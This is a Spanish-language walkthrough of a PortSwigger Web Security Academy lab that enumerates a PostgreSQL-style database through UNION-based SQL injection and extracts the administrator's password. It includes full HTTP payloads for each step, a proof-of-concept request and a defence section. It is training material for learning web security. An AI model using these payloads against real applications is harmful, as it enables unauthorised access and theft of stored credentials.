# SQL injection attack, listing the database contents on non-Oracle databases

**Categoría:** SQLi  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Enumerar el contenido de la base de datos mediante una inyección SQL y un ataque `UNION`, para obtener credenciales y acceder como administrador.
*   **Vulnerabilidad principal**: SQL Injection en el parámetro `category`.
*   **Impacto esperado**: Exposición completa de usuarios y contraseñas almacenadas en la base de datos.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: `/filter?category=<valor>` filtra productos por categoría.
*   **Parámetro relevante**: `category`.
*   **Consulta SQL sospechada**:

    ```sql
    SELECT * FROM products WHERE category = '<USER_INPUT>' AND released = 1
    ```
*   **Hipótesis**: Si la entrada no está escapada, podemos alterar la consulta y usar `UNION` para extraer datos de otras tablas.

***

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar la inyección

*   **Qué hago**: Envío `'` al final del valor.
*   **Por qué funciona**: Rompe la consulta, generando error.
*   **Evidencia**: Respuesta con error 500.

***

## Paso 2 – Determinar número de columnas

*   **Qué hago**: Uso `ORDER BY` y `UNION SELECT NULL,...` para ajustar columnas.
*   **Por qué funciona**: Necesitamos coincidir con la estructura original.
*   **Evidencia**: Respuesta sin error cuando el número de columnas es correcto.

***

## Paso 3 – Enumerar esquemas

*   **Payload**:

    ```http
    GET /filter?category=Lifestyle' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -
    ```
*   **Por qué funciona**: `information_schema.schemata` lista las bases de datos.
*   **Evidencia**: Aparecen nombres como `public`.

***

## Paso 4 – Enumerar tablas del esquema `public`

*   **Payload**:

    ```http
    GET /filter?category=Lifestyle' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'-- -
    ```
*   **Evidencia**: Identificamos tabla `users_ashuxc`.

***

## Paso 5 – Enumerar columnas de la tabla `users_ashuxc`

*   **Payload**:

    ```http
    GET /filter?category=Lifestyle' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users_ashuxc'-- -
    ```
*   **Evidencia**: Columnas `username_gbhouy` y `password_lzruax`.

***

## Paso 6 – Extraer credenciales del administrador

*   **Payload final**:

    ```http
    GET /filter?category=Lifestyle' UNION SELECT NULL,username_gbhouy||'~'||password_lzruax FROM users_ashuxc WHERE username_gbhouy='administrator'-- -
    ```
*   **Por qué funciona**: Concatenamos usuario y contraseña con `||`.
*   **Evidencia**: Obtenemos `administrator~<password>`.

***

# ✅ PoC mínima

```http
GET /filter?category=Lifestyle' UNION SELECT NULL,username_gbhouy||'~'||password_lzruax FROM users_ashuxc WHERE username_gbhouy='administrator'-- -
Host: <lab-id>.web-security-academy.net
```

***

# 🔒 Defensa

*   **Causas**: Uso de concatenación directa en consultas SQL.
*   **Detección en logs**:
    *   Parámetros con `UNION SELECT`
    *   Acceso a `information_schema`
*   **Mitigación recomendada**:
    *   Consultas parametrizadas (*prepared statements*)
    *   Validación estricta de entrada
    *   Principio de mínimo privilegio en la base de datos

***

# 📝 Notas y trampas

*   En bases de datos no Oracle, `information_schema` es clave para enumeración.
*   La concatenación en PostgreSQL se hace con `||`.
*   Ajustar número de columnas antes de usar `UNION`.

***

# 📚 Referencias

* [PortSwigger Lab – SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
